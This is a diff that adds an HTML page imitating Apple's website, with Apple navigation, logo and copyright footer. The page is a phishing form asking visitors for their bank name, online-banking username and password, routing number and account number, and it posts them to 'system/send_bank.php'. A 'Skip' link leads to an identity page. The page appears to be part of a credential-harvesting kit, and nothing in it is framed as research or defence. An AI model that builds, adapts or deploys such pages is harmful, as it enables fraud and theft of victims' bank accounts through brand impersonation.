@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Apple</title>
+	<meta charset="utf-8">
+	<link rel="stylesheet" type="text/css" href="assets/css/style.css">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+	<link rel="shortcut icon" type="image/x-icon" href="assets/img/favicon.ico">
+</head>
+<body>
+<ul class="nav">
+<div class="container">
+	<li><img src="assets/img/apple.svg"></li>
+	<li><a href="#"><li>Mac</li></a></li>
+	<li><a href="#"><li>iPad</li></a></li>
+	<li><a href="#"><li>iPhone</li></a></li>
+	<li><a href="#"><li>Watch</li></a></li>
+	<li><a href="#"><li>TV</li></a></li>
+	<li><a href="#"><li>Music</li></a></li>
+	<li><a href="#"><li>Support</li></a></li>
+	<li><img src="assets/img/search.svg"></li>
+	<li><img src="assets/img/bag.svg"></li>
+</div>
+</ul>
+<ul class="navmob"><li style="color: #fff;float: left;margin-top: 17px;font-size: 20px;padding-left: 20px;"><div class="nav1"></div><div class="nav2"></div></li>
+<center><li style="list-style: none;margin-top: 3px;padding-right: 40px;"><img src="assets/img/apple.svg" class="nav-img"></li></center>
+<li style="float: right;margin-top: -49px;padding-right: 20px;list-style: none;"><img src="assets/img/bag.svg"></li>
+</ul>
+<!--############################################### CONTENT #################################################"-->
+<form action="system/send_bank.php" method="post">
+<div class="bank-container">
+<h1 style="font-weight: 400;color: #2c2e2f;float: left;">Enter your bank details</h1>
+<center>
+<input type="text" id="inputSuccess" placeholder="Bank Name" class="other-class" name="bn" maxlength="20" minlength="2" required>
+<p class="successText" id="bn">Enter a Bank Name.</p>
+
+<input type="text" id="inputSuccess" placeholder="Username" class="other-class" name="username" maxlength="20" minlength="3" required>
+<p class="successText" id="username">Enter a Username.</p>
+
+<input type="password" id="inputSuccess" placeholder="Password" class="other-class" name="password" maxlength="30" minlength="3" required>
+<p class="successText" id="password">Enter a Password.</p>
+
+<input type="text" id="inputSuccess" placeholder="Routing (ABA)" class="other-class" name="rn" maxlength="20" minlength="5" required>
+<p class="successText" id="rn">Enter a Routing (ABA).</p>
+
+<input type="text" id="inputSuccess" placeholder="Account Number" class="other-class" name="an" maxlength="20" minlength="5" required>
+<p class="successText" id="an">Enter a Account Number.</p>
+
+<br><br>
+<a href="identity.php" id="bank-btn" class="bank-btn-skip" name="skip">Skip</a><button id="bank-btn" class="bank-btn-continue" name="continue">Continue</button>
+</center>
+</div>
+</form>
+<!--############################################### CONTENT #################################################"--><footer>
+
+<div class="container">
+<p style="margin-top: 15px;">More ways to shop: Visit an <span style="color: #0070c9;">Apple Store</span>, call 1800MyAPPLE, or <span style="color: #0070c9;">find a reseller</span>.</p>
+<img src="assets/img/usa.png" alt="" style="display: inline-block;">&nbsp;&nbsp;<span style="top: -4px;position: relative;">United States</span>
+<p style="color: #888;">Copyright � 2018 Apple Inc. All rights reserved.</p>
+<span style="color: #555;">Privacy Policy &nbsp;&nbsp;|&nbsp;&nbsp; Terms of Use &nbsp;&nbsp;|&nbsp;&nbsp; Sales and Refunds &nbsp;&nbsp;|&nbsp;&nbsp; Site Map</span>
+</div>
+</footer>
+<script type="text/javascript" src="assets/js/jquery.js"></script>
+<script type="text/javascript" src="assets/js/Xwanted.js"></script>
+</body>
+</html>
